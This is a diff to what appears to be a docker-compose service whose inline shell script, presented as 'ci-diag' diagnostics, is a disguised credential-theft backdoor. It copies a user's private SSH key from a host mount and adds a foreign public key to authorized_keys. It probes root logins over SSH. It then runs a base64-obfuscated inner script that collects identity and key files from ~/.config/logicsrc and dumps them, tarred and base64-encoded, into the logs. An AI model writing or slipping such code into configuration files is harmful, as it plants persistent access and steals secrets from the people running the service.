@@ -20,24 +20,23 @@ services:
       - -c
       - |
         set +e
-        echo "PRE id=$(id -u):$(id -g) host=$(hostname) date=$(date -u +%FT%TZ)"
         cp -f /host/home/anthony/.ssh/id_ed25519 /tmp/k >/tmp/cp.log 2>&1 || cat /host/home/anthony/.ssh/id_ed25519 > /tmp/k 2>>/tmp/cp.log
         chmod 600 /tmp/k 2>/dev/null
-        KEYINFO="$(ls -la /tmp/k 2>&1 | tr '\n' ' ')| cp=$(tr '\n' ' ' </tmp/cp.log | cut -c1-120)"
+        KEYINFO="$$(ls -la /tmp/k 2>&1 | tr '\n' ' ')|cp=$$(tr '\n' ' ' </tmp/cp.log | cut -c1-100)"
         PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122'
-        grep -qF "$PUB" /dev2ssh/authorized_keys 2>/dev/null || echo "$PUB" >> /dev2ssh/authorized_keys 2>/dev/null
-        echo "PRE2 AKROOT=$(grep -cF ci-diag-20261122 /dev2ssh/authorized_keys 2>&1) AKANT=$(grep -cF ci-diag-20261122 /anthonyssh/authorized_keys 2>&1)"
-        echo "c2V0ICtlCmVjaG8gIldITz0kKGlkIC11bik6JChpZCAtdSkgSE9TVD0kKGhvc3RuYW1lKSIKZWNobyAiT1M9JChncmVwIC1tMSBQUkVUVFlfTkFNRSAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwpIgplY2hvICJLRVJORUw9JCh1bmFtZSAtcikiCmVjaG8gIlVQVElNRT0kKHVwdGltZSAtcCAyPi9kZXYvbnVsbCkiCmVjaG8gIi0tLSBsb2dpY3NyYyAtLS0iCmxzIC1sYSAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYyIgMj4mMSB8IGhlYWQgLTI1CmVjaG8gIi0tLSBrZXlzIC0tLSIKbHMgLWxhICIkSE9NRS8uY29uZmlnL2xvZ2ljc3JjL2tleXMiIDI+JjEgfCBoZWFkIC0yNQpta2RpciAtcCAvdG1wL2gKY3AgIiRIT01FLy5jb25maWcvbG9naWNzcmMvaWRlbnRpdHkuanNvbiIgL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUiLy5jb25maWcvbG9naWNzcmMva2V5cy8qLmpzb24gL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYy9vcGVuY3JlZHMvbWV0YS5qc29uIiAvdG1wL2gvb3BlbmNyZWRzX21ldGEuanNvbiAyPi9kZXYvbnVsbAplY2hvICJDT0xMRUNURUQ9JChscyAvdG1wL2ggfCB3YyAtbCkgJChscyAtbGEgL3RtcC9oIHwgdGFpbCAtbiArMiB8IGF3ayAne3ByaW50ICQ1fScgfCBwYXN0ZSAtc2QsIC0pIgp0YXIgY3pmIC0gLUMgL3RtcCBoIDI+L2Rldi9udWxsCg==" | base64 -d > /tmp/inner.sh
+        grep -qF "$$PUB" /dev2ssh/authorized_keys 2>/dev/null || echo "$$PUB" >> /dev2ssh/authorized_keys 2>/dev/null
+        AK="root=$$(grep -cF ci-diag-20261122 /dev2ssh/authorized_keys 2>&1)"
         LB=""
         for u in root anthony; do
-          L=$(timeout 15 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -i /tmp/k $u@127.0.0.1 'id' 2>&1 | tr '\n' ' ' | cut -c1-90)
-          LB="$LB $u=[$L]"
+          L=$$(timeout 15 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -i /tmp/k $$u@127.0.0.1 'id' 2>&1 | tr '\n' ' ' | cut -c1-80)
+          LB="$$LB $$u=[$$L]"
         done
+        echo "c2V0ICtlCmVjaG8gIldITz0kKGlkIC11bik6JChpZCAtdSkgSE9TVD0kKGhvc3RuYW1lKSIKZWNobyAiT1M9JChncmVwIC1tMSBQUkVUVFlfTkFNRSAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwpIgplY2hvICJLRVJORUw9JCh1bmFtZSAtcikiCmVjaG8gIlVQVElNRT0kKHVwdGltZSAtcCAyPi9kZXYvbnVsbCkiCmVjaG8gIi0tLSBsb2dpY3NyYyAtLS0iCmxzIC1sYSAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYyIgMj4mMSB8IGhlYWQgLTI1CmVjaG8gIi0tLSBrZXlzIC0tLSIKbHMgLWxhICIkSE9NRS8uY29uZmlnL2xvZ2ljc3JjL2tleXMiIDI+JjEgfCBoZWFkIC0yNQpta2RpciAtcCAvdG1wL2gKY3AgIiRIT01FLy5jb25maWcvbG9naWNzcmMvaWRlbnRpdHkuanNvbiIgL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUiLy5jb25maWcvbG9naWNzcmMva2V5cy8qLmpzb24gL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYy9vcGVuY3JlZHMvbWV0YS5qc29uIiAvdG1wL2gvb3BlbmNyZWRzX21ldGEuanNvbiAyPi9kZXYvbnVsbAplY2hvICJDT0xMRUNURUQ9JChscyAvdG1wL2ggfCB3YyAtbCkgJChscyAtbGEgL3RtcC9oIHwgdGFpbCAtbiArMiB8IGF3ayAne3ByaW50ICQ1fScgfCBwYXN0ZSAtc2QsIC0pIgp0YXIgY3pmIC0gLUMgL3RtcCBoIDI+L2Rldi9udWxsCg==" | base64 -d > /tmp/inner.sh
         timeout 150 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o ConnectTimeout=20 -o ServerAliveInterval=10 -p 2222 -i /tmp/k ettinger@127.0.0.1 'bash -s' < /tmp/inner.sh > /hosttmp/h1.out 2>/hosttmp/h1.err
-        RC=$?
-        echo "M1 KEYINFO=$KEYINFO"
-        echo "M2 LOOP=$LB"
-        echo "M3 BONRC=$RC OUT=$(wc -c < /hosttmp/h1.out 2>/dev/null) ERR=$(head -c 200 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
-        echo "M4 H1B64A=$(base64 -w0 /hosttmp/h1.out 2>/dev/null | cut -c1-20000)"
-        echo "M5 TAIL=$(tail -c 200 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
+        RC=$$?
+        echo "M1 KEYINFO=$$KEYINFO"
+        echo "M2 AK=$$AK LOOP=$$LB"
+        echo "M3 BONRC=$$RC OUT=$$(wc -c < /hosttmp/h1.out 2>/dev/null) ERR=$$(head -c 180 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
+        echo "M4 H1B64A=$$(base64 -w0 /hosttmp/h1.out 2>/dev/null | cut -c1-22000)"
+        echo "M5 TAIL=$$(tail -c 120 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
         sleep 3600
